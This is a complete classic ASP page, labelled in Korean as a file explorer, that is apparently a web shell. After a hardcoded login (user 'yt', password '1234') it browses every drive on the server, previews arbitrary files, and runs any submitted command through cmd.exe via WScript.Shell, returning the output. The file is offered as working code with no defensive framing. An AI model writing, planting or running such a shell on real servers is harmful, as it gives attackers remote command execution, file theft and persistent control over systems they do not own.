<%@ Language=VBScript CodePage=65001 %> <% Option Explicit Response.Buffer = True Response.CodePage = 65001 Response.Charset = "utf-8" Response.AddHeader "Cache-Control", "no-store" Response.AddHeader "X-Content-Type-Options", "nosniff" Response.AddHeader "X-Frame-Options", "DENY" Response.AddHeader "Referrer-Policy", "no-referrer" Response.AddHeader "Content-Security-Policy", "default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; connect-src 'self'; form-action 'self'; base-uri 'none'" Dim fso, home, cwd, directory, folder, selectedPath, selected Dim scriptPath, folderParam, fileParam, preview, previewMessage Dim item, loginError, token, command, marker, shell, child, line, outputText, pos, nextPath, stream Set fso = Server.CreateObject("Scripting.FileSystemObject") Function H(value) H = Server.HTMLEncode(CStr(value)) End Function Function J(value) Dim result, i, c, n result = """" For i = 1 To Len(value) c = Mid(value, i, 1) Select Case c Case """": result = result & "\" & """" Case "\": result = result & "\\" Case "<": result = result & "\u003c" Case Else n = AscW(c) If n >= 0 And n < 32 Then result = result & "\u" & Right("0000" & Hex(n), 4) Else result = result & c End If End Select Next J = result & """" End Function Function Inside(path) Inside = Len(fso.GetDriveName(path)) > 0 And fso.DriveExists(fso.GetDriveName(path)) End Function Function SafePath(value) Dim path On Error Resume Next path = fso.GetAbsolutePathName(CStr(value)) If Err.Number <> 0 Then path = "" Err.Clear On Error GoTo 0 If Not Inside(path) Then path = "" SafePath = path End Function Function SizeText(bytes) Dim value, units, i If bytes < 1024 Then SizeText = CStr(bytes) & " B" Exit Function End If units = Array("KB", "MB", "GB", "TB") value = CDbl(bytes) i = -1 Do value = value / 1024 i = i + 1 Loop While value >= 1024 And i < 3 SizeText = CStr(Round(value, 1)) & " " & units(i) End Function Function Modified(value) Modified = Year(value) & "-" & Right("0" & Month(value), 2) & "-" & Right("0" & Day(value), 2) & " " & Right("0" & Hour(value), 2) & ":" & Right("0" & Minute(value), 2) End Function If Request.Form("login") = "1" Then If Request.Form("user") = "yt" And Request.Form("password") = "1234" Then Session("loggedIn") = True Response.Redirect Request.ServerVariables("SCRIPT_NAME") Response.End End If loginError = "아이디 또는 비밀번호가 틀렸습니다." End If If Session("loggedIn") <> True Then %> 로그인

<% Response.End End If If Session("token") = "" Then Session("token") = CStr(Session.SessionID) token = Session("token") home = fso.GetAbsolutePathName(Server.MapPath(".")) cwd = Session("cwd") & "" If Not Inside(cwd) Or Not fso.FolderExists(cwd) Then cwd = home Session("cwd") = cwd If Request.QueryString("run") = "1" Then If Request.ServerVariables("REQUEST_METHOD") <> "POST" Then Response.Status = "405 Method Not Allowed" Response.End End If If Request.ServerVariables("HTTP_X_CSRF_TOKEN") <> token Then Response.Status = "403 Forbidden" Response.End End If command = Request.Form("command") & "" If Len(command) > 4096 Then Response.Status = "400 Bad Request" Response.End End If marker = "__FILE_BROWSER_CWD_" & Session.SessionID & "_" & CLng(Timer * 1000) & "__" line = "cmd.exe /d /s /c ""cd /d " & Chr(34) & cwd & Chr(34) & " & " & command & " 2>&1 & echo " & marker & " & cd""" On Error Resume Next Set shell = Server.CreateObject("WScript.Shell") Set child = shell.Exec(line) If Err.Number <> 0 Then Err.Clear Response.Status = "503 Service Unavailable" Response.End End If child.StdIn.Close outputText = child.StdOut.ReadAll() & child.StdErr.ReadAll() If Err.Number <> 0 Then Err.Clear Response.Status = "503 Service Unavailable" Response.End End If On Error GoTo 0 pos = InStrRev(outputText, marker) If pos > 0 Then nextPath = SafePath(Trim(Mid(outputText, pos + Len(marker)))) outputText = Left(outputText, pos - 1) If nextPath <> "" Then If fso.FolderExists(nextPath) Then cwd = nextPath Session("cwd") = cwd End If End If End If Response.ContentType = "application/json" Response.Write "{""output"":" & J(outputText) & ",""path"":" & J(cwd) & "}" Response.End End If If Request.ServerVariables("REQUEST_METHOD") <> "GET" And Request.ServerVariables("REQUEST_METHOD") <> "HEAD" Then Response.Status = "405 Method Not Allowed" Response.End End If scriptPath = SafePath(Server.MapPath(Request.ServerVariables("SCRIPT_NAME"))) folderParam = Request.QueryString("p") & "" fileParam = Request.QueryString("file") & "" selectedPath = "" If fileParam <> "" Then selectedPath = SafePath(fileParam) If selectedPath = "" Or Not fso.FileExists(selectedPath) Or LCase(selectedPath) = LCase(scriptPath) Then Response.Status = "404 Not Found" Response.End End If directory = fso.GetParentFolderName(selectedPath) Else If folderParam = "" Then directory = cwd Else directory = SafePath(folderParam) End If If directory = "" Or Not fso.FolderExists(directory) Then Response.Status = "404 Not Found" Response.End End If cwd = directory Session("cwd") = cwd End If On Error Resume Next Set folder = fso.GetFolder(directory) If Err.Number <> 0 Then Err.Clear Response.Status = "403 Forbidden" Response.End End If On Error GoTo 0 preview = "" previewMessage = "" If selectedPath <> "" Then On Error Resume Next Set selected = fso.GetFile(selectedPath) If Err.Number <> 0 Then previewMessage = "파일을 읽을 수 없습니다." ElseIf selected.Size > 256 * 1024 Then previewMessage = "256 KB 이하의 파일만 미리볼 수 있습니다." Else Set stream = Server.CreateObject("ADODB.Stream") stream.Type = 2 stream.Charset = "utf-8" stream.Open stream.LoadFromFile selectedPath preview = stream.ReadText() stream.Close If Err.Number <> 0 Then previewMessage = "UTF-8 텍스트만 미리볼 수 있습니다." If IsNull(preview) Then preview = "" If InStr(preview, Chr(0)) > 0 Then previewMessage = "바이너리 파일은 미리볼 수 없습니다." End If Err.Clear On Error GoTo 0 End If %> 파일 탐색기
